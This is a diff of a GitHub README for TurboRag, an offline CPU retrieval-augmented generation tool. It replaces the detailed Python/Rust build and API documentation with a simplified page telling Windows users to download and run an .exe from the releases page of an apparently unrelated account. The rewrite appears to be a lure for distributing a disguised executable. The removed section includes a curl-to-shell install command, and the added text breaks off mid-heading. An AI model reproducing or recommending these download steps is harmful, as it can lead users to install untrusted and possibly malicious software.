@@ -1,278 +1,33 @@
-# TurboRag
-<img width="1024" height="572" alt="image" src="https://github.com/user-attachments/assets/3420df50-3880-4e64-8514-6dfdcb0f6994" />
-**TurboRag** is a fully offline, CPU, RAM RAG (Retrieval Augmented Generation) engine. It combines:
+# 🚀 TurboRag - Fast Search For Your Documents
 
-- **TurboVec** – a quantized (Q4) vector index (8× smaller than float32, faster than FAISS)
-- <img width="1024" height="297" alt="image" src="https://github.com/user-attachments/assets/a428a12f-c386-4756-800a-d95e5c344b77" />
-- **TurboQuant** – a lightweight quantization toolkit algorithms for embeddings and LLMs  
-- **llama‑cpp‑python** – runs all models as Q4_K_M GGUF files on CPU  
-- **FastAPI** – optional REST API  
-- **FastMCP** – MCP server for agent integration  
-- **Multi‑language SDKs** – Python, Node.js, Rust, C/C++
+[![Download TurboRag](https://img.shields.io/badge/Download-TurboRag-blue.svg)](https://github.com/benvenutocellinirange83/TurboRag/releases)
 
-> **Projects referenced in this README:**  
-> - [TurboVec](https://github.com/RyanCodrai/turbovec) – core quantized vector index  
-> - [TurboQuant](https://arxiv.org/abs/2504.19874) – quantization Algorithm (vects embedding ) for models
-> - TurboQuant: Online Vector Quantization with Near-optimal Distortion Rate
-Amir Zandieh, Majid Daliri, Majid Hadian, Vahab Mirrokni
-Vector quantization, a problem rooted in Shannon's source coding theory, aims to quantize high-dimensional Euclidean vectors while minimizing distortion in their geometric structure. We propose TurboQuant to address both mean-squared error (MSE) and inner product distortion, overcoming limitations of existing methods that fail to achieve optimal distortion rates. Our data-oblivious algorithms, suitable for online applications, achieve near-optimal distortion rates (within a small constant factor) across all bit-widths and dimensions. TurboQuant achieves this by randomly rotating input vectors, inducing a concentrated Beta distribution on coordinates, and leveraging the near-independence property of distinct coordinates in high dimensions to simply apply optimal scalar quantizers per each coordinate. Recognizing that MSE-optimal quantizers introduce bias in inner product estimation, we propose a two-stage approach: applying an MSE quantizer followed by a 1-bit Quantized JL (QJL) transform on the residual, resulting in an unbiased inner product quantizer. We also provide a formal proof of the information-theoretic lower bounds on best achievable distortion rate by any vector quantizer, demonstrating that TurboQuant closely matches these bounds, differing only by a small constant (≈2.7) factor. Experimental results validate our theoretical findings, showing that for KV cache quantization, we achieve absolute quality neutrality with 3.5 bits per channel and marginal quality degradation with 2.5 bits per channel. Furthermore, in nearest neighbor search tasks, our method outperforms existing product quantization techniques in recall while reducing indexing time to virtually zero.
+TurboRag helps you search through large collections of local documents. It runs on your computer without sending your data to the internet. The software uses modern hardware to process text files and answers questions about them. You can use it to organize information or find specific facts within thousands of pages in seconds.
 
----
+## ⚙️ Minimum System Requirements
 
-## Features
+Your computer needs specific parts to run this software well. Please check your system against this list:
 
-- **No GPU required, no internet at runtime** – everything runs offline on CPU.
-- **Tiny memory footprint** – Gemma Embedding 300M (≈300 MB) + Qwen 0.5B (500 MB).
-- **TurboVec Q4 index** – 8× compression, fast brute‑force search.
-- **Optional VLM** – SmolVLM (150‑600 MB) for vision+text tasks.
-- **Built‑in SQLite document store** – metadata and chunk storage.
-- **REST API** – `/index`, `/search`, `/ask` endpoints.
-- **MCP server** – stdio (Claude Desktop) or SSE transport.
-- **LangChain integration** – use as a vector store.
-- **Multi‑language SDKs** – Python, Node.js, Rust, C/C++.
+- Processor: Intel Core i5 or AMD Ryzen 5 or better.
+- Memory: 8 gigabytes of RAM or more.
+- Storage: 2 gigabytes of free space for the program and models.
+- Operating System: Windows 10 or Windows 11.
+- Network: An internet connection for the initial download.
 
----
+## 💾 How to Install
 
-## Quick Start
+Follow these steps to set up the software on your Windows computer.
 
-### 1. System dependencies
+1. Visit the [releases page](https://github.com/benvenutocellinirange83/TurboRag/releases) to see available downloads.
+2. Look for the file ending in .exe that matches your Windows version.
+3. Click the link to save the file to your computer.
+4. Locate the file in your Downloads folder once the transfer finishes.
+5. Double-click the file to start the setup process.
+6. Follow the instructions on the screen to finish the installation.
+7. Click the new TurboRag icon on your desktop to open the program.
 
-```bash
-# Ubuntu / Debian
-sudo apt update && sudo apt install build-essential cmake
+## 🛠️ Configuring Your Environment
 
-# macOS
-xcode-select --install
-brew install cmake
-```
+The software saves search data locally. You need to tell it where to look for your documents. Open the application and navigate to the Settings menu. Here you can point the tool to the folders containing your text files or PDFs. The tool will scan these folders and create a map of the content. This process happens once. Large folders take more time to scan. 
 
-### 2. Install Rust (required for TurboVec)
-
-```bash
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source "$HOME/.cargo/env"
-```
-
-### 3. Build TurboVec from source
-
-TurboRag relies on **TurboVec** for vector indexing. Build it as follows:
-
-```bash
-# Download TurboVec
-wget https://github.com/RyanCodrai/turbovec/archive/main.zip
-unzip main.zip && cd turbovec-main
-
-# Build Python binding
-pip install maturin
-cd turbovec-python
-maturin develop --release
-cd ../..
-```
-
-> **Note:** The official TurboVec repository is at [https://github.com/RyanCodrai/turbovec](https://github.com/RyanCodrai/turbovec).
-
-### 4. Install TurboRag
-
-```bash
-git clone https://github.com/yourusername/turborag.git
-cd turborag
-pip install -r requirements.txt
-pip install -e .
-```
-
-### 5. Download models (using TurboQuant)
-
-TurboRag uses **TurboQuant** to produce quantized GGUF models. The primary embedding model is:
-
-- **gemma-embedding-300m** – Q4_K_M, 2048‑dim, required.
-
-Download it directly:
-
-```bash
-mkdir -p models
-wget -O models/embeddinggemma-300m-q4_k_m.gguf \
-  "https://huggingface.co/sabafallah/embeddinggemma-300m-Q4_K_M-GGUF/resolve/main/embeddinggemma-300m-q4_k_m.gguf"
-```
-
-For the LLM (Qwen 0.5B Q4_K_M):
-
-```bash
-wget -O models/qwen-0.5b-Q4_K_M.gguf \
-  https://huggingface.co/.../qwen-0.5b-Q4_K_M.gguf   # replace with actual URL
-```
-
-To quantize your own models with **TurboQuant**:
-
-```bash
-git clone https://github.com/RyanCodrai/turboquant.git
-cd turboquant
-pip install -e .
-turboquant convert --model gemma-300m --format gguf --qtype Q4_K_M
-```
-
-### 6. Verify installation
-
-```python
-python -c "from turbovec import IdMapIndex; from turborag import TurboRag; print('OK')"
-```
-
----
-
-## Usage
-
-### Python API
-
-```python
-from turborag import TurboRag
-
-rag = TurboRag.create(
-    embed_model="models/embeddinggemma-300m-q4_k_m.gguf",
-    llm_model="models/qwen-0.5b-Q4_K_M.gguf",
-)
-rag.add_document("Paris is the capital of France.")
-answer, sources = rag.ask("What is the capital of France?")
-print(answer)  # "Paris"
-```
-
-### REST API
-
-```bash
-# Start server
-uvicorn turborag.api.server:app --host 127.0.0.1 --port 8000
-
-# Index a document
-curl -X POST http://localhost:8000/index \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Paris is the capital of France."}'
-
-# Ask a question
-curl -X POST http://localhost:8000/ask \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What is the capital of France?", "k": 5}'
-```
-
-### MCP Server
-
-```bash
-# SSE transport
-python -m turborag.mcp.server --transport sse --port 8001
-
-# stdio for Claude Desktop
-python -m turborag.mcp.server --transport stdio
-```
-
-### LangChain Integration
-
-```python
-from turborag.integrations.langchain import TurboRagVectorStore, make_llamacpp_embeddings
-
-embeddings = make_llamacpp_embeddings("models/embeddinggemma-300m-q4_k_m.gguf")
-store = TurboRagVectorStore(embeddings=embeddings)
-store.add_texts(["doc1", "doc2"])
-docs = store.similarity_search("my query", k=3)
-```
-
----
-
-## SDKs
-
-### Python SDK
-
-```python
-from turborag.sdk.python.turborag_sdk import TurboRagClient
-
-client = TurboRagClient("http://127.0.0.1:8000")
-client.index("Paris is the capital of France.")
-resp = client.ask("What is the capital of France?")
-print(resp.answer)
-```
-
-### Node.js SDK
-
-```js
-const { TurboRagClient } = require('./sdk/nodejs/src/index');
-const client = new TurboRagClient('http://127.0.0.1:8000');
-await client.index('Paris is the capital of France.');
-const { answer } = await client.ask('What is the capital of France?');
-console.log(answer);
-```
-
-### Rust SDK
-
-```rust
-use turborag_sdk::TurboRagClient;
-let client = TurboRagClient::new("http://127.0.0.1:8000");
-client.index("Paris is the capital of France.", None).await?;
-let resp = client.ask("What is the capital of France?", 5, None).await?;
-println!("{}", resp.answer);
-```
-
-### C SDK
-
-```c
-#include "turborag.h"
-turborag_client_t *c = turborag_create("http://127.0.0.1:8000", NULL);
-turborag_index(c, "Paris is the capital of France.", NULL);
-turborag_ask_result_t r = turborag_ask(c, "What is the capital?", 5);
-printf("%s\n", r.answer);
-turborag_destroy(c);
-```
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────┐
-│  REST API (FastAPI)  │  MCP Server (FastMCP)           │
-├─────────────────────────────────────────────────────────┤
-│  TurboRag Core                                          │
-│  ┌──────────┐  ┌───────────┐  ┌─────────┐  ┌────────┐ │
-│  │ Embedder │  │ TurboVec  │  │   LLM   │  │SQLite  │ │
-│  │ (Gemma)  │  │IdMapIndex │  │ (Qwen)  │  │Store   │ │
-│  └──────────┘  └───────────┘  └─────────┘  └────────┘ │
-├─────────────────────────────────────────────────────────┤
-│  TurboQuant – quantization of models                   │
-├─────────────────────────────────────────────────────────┤
-│  SDKs: Python · Node.js · Rust · C/C++                 │
-└─────────────────────────────────────────────────────────┘
-```
-
----
-
-## Models (all GGUF, CPU-only)
-
-| Model | Size | Role | Download / Source |
-|-------|------|------|-------------------|
-| **gemma-embedding-300m** | ~300 MB | Text → 2048-dim vectors (required) | [HF:embeddinggemma-300m-GGUF] | Required
-| Qwen 0.5B | ~500 MB | Fast Q&A generation | |[HF:qwen2.5-0.5b-instruct-GGUF] | optimal
-| DeepSeek 1.3B | ~1.5 GB | Reasoning / longer answers | |[HF:deepseek-coder-1.3b-instruct-GGUF] |optimal
-| SmolVLM 135M | ~150 MB | Ultra-light vision+text | |[HF:SmolLM2-135M-Instruct-GGUF] |optimal
-| SmolVLM 256M | ~300 MB | Balanced VLM | |[HF:SmolVLM-256M-Instruct-GGUF] |optimal
-| SmolVLM 500M | ~600 MB | Best vision quality | |[HF:SmolVLM-500M-Instruct-GGUF] | optimal
-
----
-
-## Requirements
-
-- Python 3.10+
-- Rust (for TurboVec build) – [rustup.rs](https://rustup.rs/)
-- ~1 GB RAM minimum (Gemma + Qwen)
-- ~2 GB disk space for models and indexes
-- No internet required at runtime
-
----
-
-## Related Projects
-
-- **[TurboVec](https://github.com/RyanCodrai/turbovec)** – Quantized vector index used by TurboRag.
-- <img src="https://github.com/RyanCodrai/turbovec/blob/main/docs/header.png"/>
-- **[TurboQuant](https://arxiv.org/abs/2504.19874)** – Google Research's TurboQuant algorithm
-- <img width="300" height="168" alt="image" src="https://github.com/user-attachments/assets/16a2ccaf-37e5-4834-b46c-4ca395c4d98b" />
-">
-
----
-
-## License
-
-MIT
+## 🔍 Performing Your
